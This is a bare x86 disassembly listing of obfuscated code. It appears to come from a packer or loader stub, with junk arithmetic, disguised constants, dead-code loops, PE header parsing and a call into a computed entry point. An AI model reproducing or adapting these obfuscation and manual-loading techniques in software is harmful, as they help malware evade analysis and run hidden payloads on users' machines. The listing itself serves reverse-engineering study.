  42463c:	cmp    eax,0xffffffff
  42463f:	mov    DWORD PTR ds:0x42a296,0x62c6
  424649:	jne    0x423bf5
  42464f:	and    DWORD PTR ds:0x42a2de,0x5eb4
  424659:	push   0xf
  42465b:	adc    DWORD PTR ds:0x42a28a,0x4918
  424665:	lea    eax,[esp+0x44]
  424669:	or     DWORD PTR ds:0x42a2a6,0x42a25e
  424673:	push   eax
  424674:	sbb    DWORD PTR ds:0x42a2a2,0x42a262
  42467e:	push   0x4298c6
  424683:	xor    DWORD PTR ds:0x42a2d2,0x1d8b
  42468d:	push   0x4298da
  424692:	and    DWORD PTR ds:0x42a2b6,0x42a302
  42469c:	push   0x4298fa
  4246a1:	not    DWORD PTR ds:0x42a2d2
  4246a7:	call   esi
  4246a9:	imul   eax,eax,0x300000
  4246af:	cmp    eax,0x1b00000
  4246b4:	mov    DWORD PTR ds:0x42a292,0xbee
  4246be:	jne    0x423bf5
  4246c4:	xor    DWORD PTR ds:0x42a266,0x42a2c6
  4246ce:	lea    eax,[esp+0x1b8]
  4246d5:	push   eax
  4246d6:	or     DWORD PTR ds:0x42a2be,0x2cef
  4246e0:	push   0x429936
  4246e5:	call   DWORD PTR ds:0x42a3e6
  4246eb:	cmp    eax,0xffffffff
  4246ee:	mov    DWORD PTR ds:0x42a2b6,0x6b51
  4246f8:	jne    0x423bf5
  4246fe:	sub    DWORD PTR ds:0x42a276,0x363f
  424708:	lea    eax,[esp+0x78]
  42470c:	add    DWORD PTR ds:0x42a29e,0x42a302
  424716:	push   eax
  424717:	push   0x429922
  42471c:	adc    DWORD PTR ds:0x42a27a,0x42a2c6
  424726:	call   DWORD PTR ds:0x42a3c6
  42472c:	cmp    eax,0xffffffff
  42472f:	jne    0x423bf5
  424735:	or     DWORD PTR ds:0x42a292,0x4d8b
  42473f:	push   0xf
  424741:	or     DWORD PTR ds:0x42a2c6,0x42a2d2
  42474b:	lea    eax,[esp+0x44]
  42474f:	push   eax
  424750:	adc    DWORD PTR ds:0x42a2a6,0x7f91
  42475a:	push   0x429976
  42475f:	and    DWORD PTR ds:0x42a28e,0x42a27e
  424769:	push   0x42998a
  42476e:	push   0x4299aa
  424773:	call   esi
  424775:	or     DWORD PTR ds:0x42a2d6,0x5541
  42477f:	imul   eax,eax,0x300000
  424785:	mov    DWORD PTR ds:0x42a292,0x284d
  42478f:	cmp    eax,0x1b00000
  424794:	mov    DWORD PTR ds:0x42a302,0x32eb
  42479e:	jne    0x423bf5
  4247a4:	adc    DWORD PTR ds:0x42a2ee,0x651e
  4247ae:	lea    eax,[esp+0x1b8]
  4247b5:	push   eax
  4247b6:	and    DWORD PTR ds:0x42a286,0x42a2f2
  4247c0:	push   0x4299e6
  4247c5:	sub    DWORD PTR ds:0x42a2ee,0x3d63
  4247cf:	call   DWORD PTR ds:0x42a3e6
  4247d5:	mov    DWORD PTR ds:0x42a2a2,0x1646
  4247df:	cmp    eax,0xffffffff
  4247e2:	jne    0x423bf5
  4247e8:	adc    DWORD PTR ds:0x42a286,0x29d1
  4247f2:	lea    eax,[esp+0x78]
  4247f6:	push   eax
  4247f7:	sbb    DWORD PTR ds:0x42a25a,0x42a26e
  424801:	push   0x4299d2
  424806:	adc    DWORD PTR ds:0x42a28a,0x42a2ae
  424810:	call   DWORD PTR ds:0x42a3c6
  424816:	cmp    eax,0xffffffff
  424819:	jne    0x423bf5
  42481f:	push   0xf
  424821:	mov    DWORD PTR ds:0x42a2da,0x5dc8
  42482b:	lea    eax,[esp+0x44]
  42482f:	add    DWORD PTR ds:0x42a2a6,0x42a2b6
  424839:	push   eax
  42483a:	not    DWORD PTR ds:0x42a25e
  424840:	push   0x429a26
  424845:	push   0x429a3a
  42484a:	or     DWORD PTR ds:0x42a26a,0x42a25e
  424854:	push   0x429a5a
  424859:	call   esi
  42485b:	imul   eax,eax,0x300000
  424861:	cmp    eax,0x1b00000
  424866:	jne    0x423bf5
  42486c:	lea    eax,[esp+0x1b8]
  424873:	push   eax
  424874:	push   0x429a96
  424879:	xor    DWORD PTR ds:0x42a286,0x22c0
  424883:	call   DWORD PTR ds:0x42a3e6
  424889:	cmp    eax,0xffffffff
  42488c:	jne    0x423bf5
  424892:	xor    DWORD PTR ds:0x42a2d6,0x42a2f2
  42489c:	lea    eax,[esp+0x78]
  4248a0:	and    DWORD PTR ds:0x42a272,0x42a2da
  4248aa:	push   eax
  4248ab:	push   0x429a82
  4248b0:	dec    DWORD PTR ds:0x42a2ae
  4248b6:	call   DWORD PTR ds:0x42a3c6
  4248bc:	mov    DWORD PTR ds:0x42a296,0x5803
  4248c6:	cmp    eax,0xffffffff
  4248c9:	mov    DWORD PTR ds:0x42a2ee,0x7cea
  4248d3:	jne    0x423bf5
  4248d9:	xor    DWORD PTR ds:0x42a2c6,0x69dc
  4248e3:	push   0xf
  4248e5:	add    DWORD PTR ds:0x42a302,0x59e7
  4248ef:	lea    eax,[esp+0x44]
  4248f3:	push   eax
  4248f4:	push   0x429ad6
  4248f9:	and    DWORD PTR ds:0x42a2fa,0x200e
  424903:	push   0x429aea
  424908:	push   0x429b0a
  42490d:	call   esi
  42490f:	imul   eax,eax,0x300000
  424915:	cmp    eax,0x1b00000
  42491a:	mov    DWORD PTR ds:0x42a29e,0x5c25
  424924:	jne    0x423bf5
  42492a:	sbb    DWORD PTR ds:0x42a2ce,0x42a2d6
  424934:	lea    eax,[esp+0x1b8]
  42493b:	xor    DWORD PTR ds:0x42a2a2,0x42a2aa
  424945:	push   eax
  424946:	push   0x429b46
  42494b:	or     DWORD PTR ds:0x42a266,0x3d87
  424955:	call   DWORD PTR ds:0x42a3e6
  42495b:	mov    DWORD PTR ds:0x42a2ca,0x3132
  424965:	cmp    eax,0xffffffff
  424968:	jne    0x423bf5
  42496e:	lea    eax,[esp+0x78]
  424972:	push   eax
  424973:	push   0x429b32
  424978:	call   DWORD PTR ds:0x42a3c6
  42497e:	cmp    eax,0xffffffff
  424981:	jne    0x423bf5
  424987:	push   0xf
  424989:	lea    eax,[esp+0x44]
  42498d:	push   eax
  42498e:	push   0x429b86
  424993:	push   0x429b9a
  424998:	push   0x429bba
  42499d:	call   esi
  42499f:	imul   eax,eax,0x300000
  4249a5:	cmp    eax,0x1b00000
  4249aa:	jne    0x423bf5
  4249b0:	lea    eax,[esp+0x1b8]
  4249b7:	push   eax
  4249b8:	push   0x429bf6
  4249bd:	call   DWORD PTR ds:0x42a3e6
  4249c3:	cmp    eax,0xffffffff
  4249c6:	jne    0x423bf5
  4249cc:	lea    eax,[esp+0x78]
  4249d0:	push   eax
  4249d1:	push   0x429be2
  4249d6:	call   DWORD PTR ds:0x42a3c6
  4249dc:	cmp    eax,0xffffffff
  4249df:	jne    0x423bf5
  4249e5:	push   0xf
  4249e7:	lea    eax,[esp+0x44]
  4249eb:	push   eax
  4249ec:	push   0x429c36
  4249f1:	push   0x429c4a
  4249f6:	push   0x429c6a
  4249fb:	call   esi
  4249fd:	imul   eax,eax,0x300000
  424a03:	cmp    eax,0x1b00000
  424a08:	jne    0x423bf5
  424a0e:	lea    eax,[esp+0x1b8]
  424a15:	push   eax
  424a16:	push   0x429ca6
  424a1b:	call   DWORD PTR ds:0x42a3e6
  424a21:	cmp    eax,0xffffffff
  424a24:	jne    0x423bf5
  424a2a:	lea    eax,[esp+0x78]
  424a2e:	push   eax
  424a2f:	push   0x429c92
  424a34:	call   DWORD PTR ds:0x42a3c6
  424a3a:	cmp    eax,0xffffffff
  424a3d:	jne    0x423bf5
  424a43:	push   0xf
  424a45:	lea    eax,[esp+0x44]
  424a49:	push   eax
  424a4a:	push   0x429ce6
  424a4f:	push   0x429cfa
  424a54:	push   0x429d1a
  424a59:	call   esi
  424a5b:	imul   eax,eax,0x300000
  424a61:	cmp    eax,0x1b00000
  424a66:	jne    0x423bf5
  424a6c:	lea    eax,[esp+0x1b8]
  424a73:	push   eax
  424a74:	push   0x429d56
  424a79:	call   DWORD PTR ds:0x42a3e6
  424a7f:	cmp    eax,0xffffffff
  424a82:	jne    0x423bf5
  424a88:	lea    eax,[esp+0x78]
  424a8c:	push   eax
  424a8d:	push   0x429d42
  424a92:	call   DWORD PTR ds:0x42a3c6
  424a98:	cmp    eax,0xffffffff
  424a9b:	jne    0x423bf5
  424aa1:	push   0xf
  424aa3:	lea    eax,[esp+0x44]
  424aa7:	push   eax
  424aa8:	push   0x429d96
  424aad:	push   0x429daa
  424ab2:	push   0x429dca
  424ab7:	call   esi
  424ab9:	imul   eax,eax,0x300000
  424abf:	cmp    eax,0x1b00000
  424ac4:	jne    0x423bf5
  424aca:	lea    eax,[esp+0x1b8]
  424ad1:	push   eax
  424ad2:	push   0x429e06
  424ad7:	call   DWORD PTR ds:0x42a3e6
  424add:	cmp    eax,0xffffffff
  424ae0:	jne    0x423bf5
  424ae6:	lea    eax,[esp+0x78]
  424aea:	push   eax
  424aeb:	push   0x429df2
  424af0:	call   DWORD PTR ds:0x42a3c6
  424af6:	cmp    eax,0xffffffff
  424af9:	jne    0x423bf5
  424aff:	push   0xf
  424b01:	lea    eax,[esp+0x44]
  424b05:	push   eax
  424b06:	push   0x429e46
  424b0b:	push   0x429e5a
  424b10:	push   0x429e7a
  424b15:	call   esi
  424b17:	imul   eax,eax,0x300000
  424b1d:	cmp    eax,0x1b00000
  424b22:	jne    0x423bf5
  424b28:	lea    eax,[esp+0x1b8]
  424b2f:	push   eax
  424b30:	push   0x429eb6
  424b35:	call   DWORD PTR ds:0x42a3e6
  424b3b:	cmp    eax,0xffffffff
  424b3e:	jne    0x423bf5
  424b44:	mov    eax,DWORD PTR [esp+0x3c]
  424b48:	cmp    eax,0xf89c85ba
  424b4d:	je     0x424bac
  424b53:	mov    eax,DWORD PTR [esp+0x20]
  424b57:	mov    ecx,DWORD PTR [esp+0x38]
  424b5b:	xor    eax,edi
  424b5d:	add    eax,ebx
  424b5f:	cmp    eax,ecx
  424b61:	je     0x424bac
  424b67:	mov    eax,ds:0x42941e
  424b6c:	mov    eax,DWORD PTR [eax+0x194]
  424b72:	mov    ecx,DWORD PTR [eax]
  424b74:	mov    eax,DWORD PTR [ecx+0x3c]
  424b77:	push   DWORD PTR ds:0x4294fe
  424b7d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  424b81:	push   DWORD PTR ds:0x4292a2
  424b87:	add    eax,ecx
  424b89:	mov    ecx,DWORD PTR ds:0x42941e
  424b8f:	mov    ecx,DWORD PTR [ecx+0x194]
  424b95:	push   DWORD PTR [ecx]
  424b97:	call   eax
  424b99:	mov    ecx,DWORD PTR ds:0x42941e
  424b9f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424ba5:	mov    DWORD PTR [ecx],eax
  424ba7:	jmp    0x424dd9
  424bac:	mov    eax,DWORD PTR [esp+0x20]
  424bb0:	mov    ecx,DWORD PTR [esp+0x60]
  424bb4:	xor    eax,edi
  424bb6:	add    eax,ebx
  424bb8:	cmp    eax,ecx
  424bba:	jne    0x424c23
  424bc0:	mov    eax,DWORD PTR [esp+0x20]
  424bc4:	mov    ecx,DWORD PTR ds:0x42941e
  424bca:	mov    ecx,DWORD PTR [ecx+0x198]
  424bd0:	xor    eax,edi
  424bd2:	add    eax,ebx
  424bd4:	cmp    eax,DWORD PTR [ecx]
  424bd6:	jne    0x424bfc
  424bdc:	mov    eax,DWORD PTR [esp+0x20]
  424be0:	push   0xf89c85a5
  424be5:	xor    eax,edi
  424be7:	add    eax,ebx
  424be9:	push   eax
  424bea:	push   0xf89c85b9
  424bef:	push   DWORD PTR [esp+0x18]
  424bf3:	push   DWORD PTR [esp+0x30]
  424bf7:	call   0x4234dd
  424bfc:	push   DWORD PTR [esp+0xc]
  424c00:	push   DWORD PTR [esp+0x24]
  424c04:	call   0x401000
  424c09:	mov    eax,DWORD PTR [esp+0x20]
  424c0d:	xor    eax,edi
  424c0f:	add    eax,ebx
  424c11:	mov    ds:0x4294aa,eax
  424c16:	mov    eax,DWORD PTR [esp+0x20]
  424c1a:	xor    eax,edi
  424c1c:	add    eax,ebx
  424c1e:	mov    ds:0x4294a2,eax
  424c23:	mov    eax,DWORD PTR [esp+0x2c]
  424c27:	test   eax,eax
  424c29:	je     0x424dd9
  424c2f:	lea    eax,[esp+0x78]
  424c33:	mov    DWORD PTR [esp+0x64],0xf152c32
  424c3b:	push   eax
  424c3c:	mov    DWORD PTR [esp+0x78],0x712ed2f
  424c44:	mov    DWORD PTR [esp+0x74],0x373fc0d
  424c4c:	push   0x429ea2
  424c51:	mov    DWORD PTR [esp+0x70],0x72670add
  424c59:	call   DWORD PTR ds:0x42a3c6
  424c5f:	cmp    eax,0xffffffff
  424c62:	jne    0x423bf5
  424c68:	push   0xf
  424c6a:	lea    eax,[esp+0x44]
  424c6e:	push   eax
  424c6f:	push   0x429ef6
  424c74:	push   0x429f0a
  424c79:	push   0x429f2a
  424c7e:	call   esi
  424c80:	imul   eax,eax,0x300000
  424c86:	cmp    eax,0x1b00000
  424c8b:	jne    0x423bf5
  424c91:	lea    eax,[esp+0x1b8]
  424c98:	push   eax
  424c99:	push   0x429f66
  424c9e:	call   DWORD PTR ds:0x42a3e6
  424ca4:	cmp    eax,0xffffffff
  424ca7:	jne    0x423bf5
  424cad:	call   0x423162
  424cb2:	mov    eax,DWORD PTR [esp+0x34]
  424cb6:	mov    eax,DWORD PTR [esp+0xc]
  424cba:	mov    DWORD PTR [esp+0x30],eax
  424cbe:	mov    eax,DWORD PTR [esp+0x20]
  424cc2:	mov    DWORD PTR [esp+0xc],eax
  424cc6:	mov    eax,eax
  424cc8:	mov    eax,ds:0x42941e
  424ccd:	mov    ecx,DWORD PTR [eax+0x1c0]
  424cd3:	mov    edx,DWORD PTR [ecx]
  424cd5:	and    DWORD PTR [esp+0x1c],0x0
  424cda:	mov    esi,0xfabdbed8
  424cdf:	add    edx,esi
  424ce1:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424ce6:	mov    ecx,0x8a29a13d
  424ceb:	xor    edx,ecx
  424ced:	mov    DWORD PTR [esp+0x10],edx
  424cf1:	mov    edx,DWORD PTR [esp+0x1c]
  424cf5:	xor    edx,0x0
  424cf8:	cmp    DWORD PTR [esp+0x10],0x70941fe4
  424d00:	mov    DWORD PTR [esp+0x14],edx
  424d04:	jne    0x424d13
  424d0a:	cmp    edx,0xffffffff
  424d0d:	je     0x424d7c
  424d13:	mov    eax,DWORD PTR [eax+0x1c8]
  424d19:	mov    eax,DWORD PTR [eax]
  424d1b:	cdq    
  424d1c:	add    eax,esi
  424d1e:	adc    edx,0xffffffff
  424d21:	and    DWORD PTR [esp+0x1c],0x0
  424d26:	xor    edx,0x0
  424d29:	mov    DWORD PTR [esp+0x24],edx
  424d2d:	mov    edx,DWORD PTR [esp+0xc]
  424d31:	mov    DWORD PTR [esp+0x18],edx
  424d35:	xor    eax,ecx
  424d37:	add    DWORD PTR [esp+0x18],esi
  424d3b:	mov    edx,DWORD PTR [esp+0x18]
  424d3f:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424d44:	xor    edx,ecx
  424d46:	mov    DWORD PTR [esp+0x10],edx
  424d4a:	mov    edx,DWORD PTR [esp+0x1c]
  424d4e:	xor    edx,0x0
  424d51:	mov    DWORD PTR [esp+0x14],edx
  424d55:	cmp    DWORD PTR [esp+0x10],eax
  424d59:	jne    0x424d6b
  424d5f:	mov    eax,DWORD PTR [esp+0x24]
  424d63:	cmp    edx,eax
  424d65:	je     0x424d7c
  424d6b:	mov    eax,DWORD PTR [esp+0xc]
  424d6f:	add    eax,DWORD PTR [esp+0x30]
  424d73:	mov    DWORD PTR [esp+0xc],eax
  424d77:	jmp    0x424dd9
  424d7c:	mov    eax,ds:0x4294a2
  424d81:	mov    edx,DWORD PTR ds:0x4294aa
  424d87:	xor    eax,edx
  424d89:	mov    ds:0x4294a2,eax
  424d8e:	mov    edx,DWORD PTR ds:0x4294a2
  424d94:	mov    eax,DWORD PTR [esp+0x2c]
  424d98:	add    DWORD PTR [eax],edx
  424d9a:	mov    edx,DWORD PTR [esp+0xc]
  424d9e:	mov    eax,ds:0x4294a2
  424da3:	xor    edx,edi
  424da5:	add    edx,ebx
  424da7:	xor    ebx,ebx
  424da9:	add    edx,esi
  424dab:	adc    ebx,0xffffffff
  424dae:	xor    edi,edi
  424db0:	xor    edx,ecx
  424db2:	xor    ebx,0x0
  424db5:	add    eax,esi
  424db7:	adc    edi,0xffffffff
  424dba:	xor    eax,ecx
  424dbc:	xor    edi,0x0
  424dbf:	cmp    eax,edx
  424dc1:	jne    0x424dd9
  424dc7:	cmp    edi,ebx
  424dc9:	jne    0x424dd9
  424dcf:	mov    eax,ds:0x4294a2
  424dd4:	mov    ds:0x4294aa,eax
  424dd9:	lea    eax,[esp+0x78]
  424ddd:	push   eax
  424dde:	push   0x429f52
  424de3:	call   DWORD PTR ds:0x42a3c6
  424de9:	cmp    eax,0xffffffff
  424dec:	jne    0x423bf5
  424df2:	push   0xf
  424df4:	lea    eax,[esp+0x44]
  424df8:	push   eax
  424df9:	push   0x429fa6
  424dfe:	push   0x429fba
  424e03:	push   0x429fda
  424e08:	call   DWORD PTR ds:0x42a3fe
  424e0e:	imul   eax,eax,0x300000
  424e14:	cmp    eax,0x1b00000
  424e19:	jne    0x423bf5
  424e1f:	lea    eax,[esp+0x1b8]
  424e26:	push   eax
  424e27:	push   0x42a006
  424e2c:	call   DWORD PTR ds:0x42a3e6
  424e32:	cmp    eax,0xffffffff
  424e35:	jne    0x423bf5
  424e3b:	mov    eax,ds:0x42941e
  424e40:	push   0x4
  424e42:	add    eax,0x1cc
  424e47:	push   eax
  424e48:	lea    eax,[esp+0x3c]
  424e4c:	push   eax
  424e4d:	call   0x424e61
  424e52:	mov    eax,DWORD PTR [esp+0x34]
  424e56:	mov    eax,DWORD PTR [eax]
  424e58:	pop    edi
  424e59:	pop    esi
  424e5a:	pop    ebx
  424e5b:	mov    esp,ebp
  424e5d:	pop    ebp
  424e5e:	ret    0xc
  424e61:	push   ebp
  424e62:	mov    ebp,esp
  424e64:	sub    esp,0x10
  424e67:	and    DWORD PTR ds:0x42a2ea,0x0
  424e71:	mov    ecx,DWORD PTR ds:0x42a2ea
  424e77:	inc    ecx
  424e78:	mov    DWORD PTR ds:0x42a2ea,ecx
  424e7e:	cmp    DWORD PTR ds:0x42a2ea,0x8
  424e85:	jg     0x424ed1
  424e8b:	jmp    0x424eaa
  424e90:	push   0x42a27e
  424e95:	push   0x3925
  424e9a:	push   0x42912e
  424e9f:	push   0x429024
  424ea4:	call   DWORD PTR ds:0x42a3ea
  424eaa:	cmp    DWORD PTR ds:0x42a2ea,0x7
  424eb1:	jne    0x424ec4
  424eb7:	mov    ecx,DWORD PTR ds:0x42a2ea
  424ebd:	inc    ecx
  424ebe:	mov    DWORD PTR ds:0x42a2ea,ecx
  424ec4:	cmp    DWORD PTR ds:0x42a2ea,0x1f
  424ecb:	jb     0x424e71
  424ed1:	mov    eax,0xf89c85a5
  424ed6:	mov    DWORD PTR [ebp-0x4],eax
  424ed9:	xor    ecx,ecx
  424edb:	xor    ecx,DWORD PTR ds:0x42a34a
  424ee1:	mov    edx,DWORD PTR ds:0x42a396
  424ee7:	sub    ecx,edx
  424ee9:	add    ecx,DWORD PTR [ecx+edx*1]
  424eec:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  424ef3:	mov    edx,DWORD PTR ds:0x42a36a
  424ef9:	mov    ecx,DWORD PTR ds:0x42a37a
  424eff:	sub    ecx,edx
  424f01:	or     edx,DWORD PTR [edx+ecx*1]
  424f04:	mov    ecx,DWORD PTR [ebp-0x4]
  424f07:	push   esi
  424f08:	mov    edx,0x75108aa
  424f0d:	movzx  esi,BYTE PTR ds:0x42a286
  424f14:	add    DWORD PTR ds:0x42a29a,esi
  424f1a:	xor    ecx,edx
  424f1c:	mov    esi,0x3272f1
  424f21:	xor    DWORD PTR ds:0x42a2b2,0x42a27e
  424f2b:	push   edi
  424f2c:	sbb    DWORD PTR ds:0x42a2ee,0x42a29a
  424f36:	mov    edi,DWORD PTR [ebp+0x10]
  424f39:	add    ecx,esi
  424f3b:	cmp    ecx,edi
  424f3d:	mov    DWORD PTR ds:0x42a2e6,0x5270
  424f47:	je     0x4250bb
  424f4d:	mov    ecx,DWORD PTR [ebp-0x4]
  424f50:	and    DWORD PTR ds:0x42a2a2,edx
  424f56:	mov    edi,DWORD PTR [ebp+0x10]
  424f59:	add    DWORD PTR ds:0x42a272,0x5748
  424f63:	xor    eax,eax
  424f65:	xor    DWORD PTR ds:0x42a26a,0x1416
  424f6f:	xor    ecx,edx
  424f71:	sbb    DWORD PTR ds:0x42a292,0x6e41
  424f7b:	add    ecx,esi
  424f7d:	adc    DWORD PTR ds:0x42a2de,0x42a2f2
  424f87:	add    edi,0xfabdbed8
  424f8d:	adc    eax,0xffffffff
  424f90:	mov    DWORD PTR ds:0x42a2f6,0x6318
  424f9a:	xor    eax,0x0
  424f9d:	sbb    DWORD PTR ds:0x42a27e,0x42a2de
  424fa7:	mov    DWORD PTR [ebp-0xc],eax
  424faa:	inc    DWORD PTR ds:0x42a27e
  424fb0:	push   ebx
  424fb1:	xor    DWORD PTR ds:0x42a28e,edi
  424fb7:	xor    ebx,ebx
  424fb9:	neg    eax
  424fbb:	xor    edi,0x8a29a13d
  424fc1:	and    DWORD PTR ds:0x42a2be,0x0
  424fcb:	mov    eax,ds:0x42a2be
  424fd0:	inc    eax
  424fd1:	mov    ds:0x42a2be,eax
  424fd6:	cmp    DWORD PTR ds:0x42a2be,0x9
  424fdd:	jg     0x425020
  424fe3:	jmp    0x424ffb
  424fe8:	push   0x8c5e
  424fed:	push   0x42a2a2
  424ff2:	push   DWORD PTR [ebp-0x10]
  424ff5:	call   DWORD PTR ds:0x42a3ee
  424ffb:	cmp    DWORD PTR ds:0x42a2be,0x8
  425002:	jne    0x425013
  425008:	mov    eax,ds:0x42a2be
  42500d:	inc    eax
  42500e:	mov    ds:0x42a2be,eax
  425013:	cmp    DWORD PTR ds:0x42a2be,0x18
  42501a:	jb     0x424fcb
  425020:	mov    eax,ecx
  425022:	add    eax,0xfabdbed8
  425027:	adc    ebx,0xffffffff
  42502a:	xor    eax,0x8a29a13d
  42502f:	xor    ebx,0x0
  425032:	cmp    eax,edi
  425034:	jne    0x42504d
  42503a:	cmp    ebx,DWORD PTR [ebp-0xc]
  42503d:	je     0x4250b5
  425043:	jmp    0x42504d
  425048:	mov    esi,0x3272f1
  42504d:	mov    eax,DWORD PTR [ebp-0x4]
  425050:	mov    edi,DWORD PTR [ebp-0x8]
  425053:	xor    edi,edx
  425055:	add    edi,esi
  425057:	mov    esi,DWORD PTR [ebp+0x8]
  42505a:	imul   edi,ecx
  42505d:	mov    ebx,DWORD PTR [ebp+0xc]
  425060:	xor    eax,edx
  425062:	add    eax,ecx
  425064:	mov    al,BYTE PTR [ebx+eax*1+0x3272f1]
  42506b:	mov    BYTE PTR [edi+esi*1],al
  42506e:	mov    eax,DWORD PTR [ebp-0x8]
  425071:	mov    esi,DWORD PTR [ebp+0x10]
  425074:	xor    eax,edx
  425076:	xor    ebx,ebx
  425078:	add    esi,0xfabdbed8
  42507e:	adc    ebx,0xffffffff
  425081:	lea    ecx,[ecx+eax*1+0x3272f1]
  425088:	xor    edi,edi
  42508a:	xor    esi,0x8a29a13d
  425090:	xor    ebx,0x0
  425093:	mov    eax,ecx
  425095:	add    eax,0xfabdbed8
  42509a:	adc    edi,0xffffffff
  42509d:	xor    eax,0x8a29a13d
  4250a2:	xor    edi,0x0
  4250a5:	cmp    eax,esi
  4250a7:	jne    0x425048
  4250ad:	cmp    edi,ebx
  4250af:	jne    0x425048
  4250b5:	mov    eax,0xf89c85ba
  4250ba:	pop    ebx
  4250bb:	pop    edi
  4250bc:	pop    esi
  4250bd:	leave  
  4250be:	ret    0xc
  4250c1:	push   ebp
  4250c2:	mov    ebp,esp
  4250c4:	push   ecx
  4250c5:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4250cc:	or     DWORD PTR ds:0x42a292,0x42a2d6
  4250d6:	mov    eax,DWORD PTR [ebp+0x8]
  4250d9:	xor    edx,edx
  4250db:	add    edx,DWORD PTR ds:0x42a3a6
  4250e1:	mov    ecx,DWORD PTR ds:0x42a3ae
  4250e7:	sub    edx,ecx
  4250e9:	sub    edx,DWORD PTR [edx+ecx*1]
  4250ec:	movsx  eax,BYTE PTR [eax]
  4250ef:	mov    edx,0x3272f1
  4250f4:	sub    eax,edx
  4250f6:	movzx  ecx,BYTE PTR ds:0x42a2a6
  4250fd:	or     DWORD PTR ds:0x42a2ce,ecx
  425103:	mov    ecx,0x75108aa
  425108:	and    DWORD PTR ds:0x42a2d2,0x2b27
  425112:	xor    eax,ecx
  425114:	cmp    eax,0xf89c85f6
  425119:	mov    DWORD PTR ds:0x42a28e,0x60e7
  425123:	jne    0x425176
  425129:	xor    eax,eax
  42512b:	xor    eax,DWORD PTR ds:0x42a26a
  425131:	xor    DWORD PTR ds:0x42a2ba,eax
  425137:	mov    eax,DWORD PTR [ebp+0x8]
  42513a:	mov    DWORD PTR ds:0x42a2d6,0x3461
  425144:	push   esi
  425145:	mov    esi,DWORD PTR ds:0x42a262
  42514b:	adc    DWORD PTR ds:0x42a256,esi
  425151:	mov    esi,DWORD PTR [ebp+0x8]
  425154:	add    esi,DWORD PTR [eax+0x3c]
  425157:	mov    DWORD PTR [ebp+0x8],esi
  42515a:	mov    eax,DWORD PTR [ebp-0x4]
  42515d:	mov    esi,DWORD PTR [ebp+0x8]
  425160:	xor    eax,ecx
  425162:	add    eax,edx
  425164:	cmp    DWORD PTR [esi+0x54],eax
  425167:	pop    esi
  425168:	je     0x425176
  42516e:	mov    eax,DWORD PTR [ebp+0x8]
  425171:	jmp    0x42517d
  425176:	mov    eax,DWORD PTR [ebp-0x4]
  425179:	xor    eax,ecx
  42517b:	add    eax,edx
  42517d:	leave  
  42517e:	ret    0x4
  425181:	push   ebp
  425182:	mov    ebp,esp
  425184:	sub    esp,0xc
  425187:	and    DWORD PTR ds:0x42a2da,0x0
  425191:	jmp    0x4251a5
  425196:	xor    edx,edx
  425198:	or     edx,DWORD PTR ds:0x42a2da
  42519e:	inc    edx
  42519f:	mov    DWORD PTR ds:0x42a2da,edx
  4251a5:	cmp    DWORD PTR ds:0x42a2da,0x1c
  4251ac:	jae    0x4251f1
  4251b2:	cmp    DWORD PTR ds:0x42a2da,0x7
  4251b9:	jg     0x4251f1
  4251bf:	jmp    0x4251d2
  4251c4:	push   DWORD PTR [ebp-0x10]
  4251c7:	push   0x42a276
  4251cc:	call   DWORD PTR ds:0x42a3f2
  4251d2:	cmp    DWORD PTR ds:0x42a2da,0x6
  4251d9:	jne    0x4251ec
  4251df:	mov    edx,DWORD PTR ds:0x42a2da
  4251e5:	inc    edx
  4251e6:	mov    DWORD PTR ds:0x42a2da,edx
  4251ec:	jmp    0x425196
  4251f1:	push   esi
  4251f2:	sub    esi,0x6177
  4251f8:	mov    esi,0xf89c85a5
  4251fd:	and    DWORD PTR ds:0x42a26a,0x14cd
  425207:	mov    DWORD PTR [ebp-0x8],esi
  42520a:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  425211:	and    DWORD PTR ds:0x42a2e2,ebx
  425217:	push   edi
  425218:	mov    eax,eax
  42521a:	or     ecx,0x7f14
  425220:	mov    eax,DWORD PTR [ebp-0x4]
  425223:	add    ecx,edi
  425225:	mov    edi,DWORD PTR [ebp-0x8]
  425228:	or     edx,edx
  42522a:	mov    ecx,0x75108aa
  42522f:	and    DWORD PTR ds:0x42a2da,0x0
  425239:	jmp    0x42524b
  42523e:	mov    edx,DWORD PTR ds:0x42a2da
  425244:	inc    edx
  425245:	mov    DWORD PTR ds:0x42a2da,edx
  42524b:	cmp    DWORD PTR ds:0x42a2da,0x1d
  425252:	jae    0x425294
  425258:	cmp    DWORD PTR ds:0x42a2da,0xd
  42525f:	jge    0x425294
  425265:	jmp    0x425275
  42526a:	push   0x42a2d2
  42526f:	call   DWORD PTR ds:0x42a3f6
  425275:	cmp    DWORD PTR ds:0x42a2da,0xc
  42527c:	jne    0x42528f
  425282:	mov    edx,DWORD PTR ds:0x42a2da
  425288:	inc    edx
  425289:	mov    DWORD PTR ds:0x42a2da,edx
  42528f:	jmp    0x42523e
  425294:	xor    eax,ecx
  425296:	xor    edi,ecx
  425298:	mov    edx,0x3272f1
  42529d:	add    edi,edx
  42529f:	add    eax,edx
  4252a1:	imul   eax,edi
  4252a4:	mov    edi,DWORD PTR [ebp+0xc]
  4252a7:	cmp    edi,eax
  4252a9:	je     0x4252fe
  4252af:	mov    DWORD PTR [ebp-0xc],esi
  4252b2:	mov    eax,DWORD PTR [ebp-0xc]
  4252b5:	mov    esi,DWORD PTR [ebp+0xc]
  4252b8:	xor    eax,ecx
  4252ba:	lea    eax,[eax*8+0x1939800]
  4252c1:	mov    eax,DWORD PTR [esi+eax*1]
  4252c4:	mov    DWORD PTR [ebp+0xc],eax
  4252c7:	mov    eax,DWORD PTR [ebp-0x4]
  4252ca:	mov    esi,DWORD PTR [ebp-0x8]
  4252cd:	xor    eax,ecx
  4252cf:	xor    esi,ecx
  4252d1:	add    esi,edx
  4252d3:	add    eax,edx
  4252d5:	imul   eax,esi
  4252d8:	mov    esi,DWORD PTR [ebp+0xc]
  4252db:	cmp    esi,eax
  4252dd:	je     0x4252fe
  4252e3:	mov    eax,DWORD PTR [ebp-0x4]
  4252e6:	xor    eax,ecx
  4252e8:	mov    ecx,DWORD PTR [ebp+0xc]
  4252eb:	add    eax,edx
  4252ed:	imul   eax,ecx
  4252f0:	add    eax,DWORD PTR [ebp+0x8]
  4252f3:	mov    DWORD PTR [ebp+0xc],eax
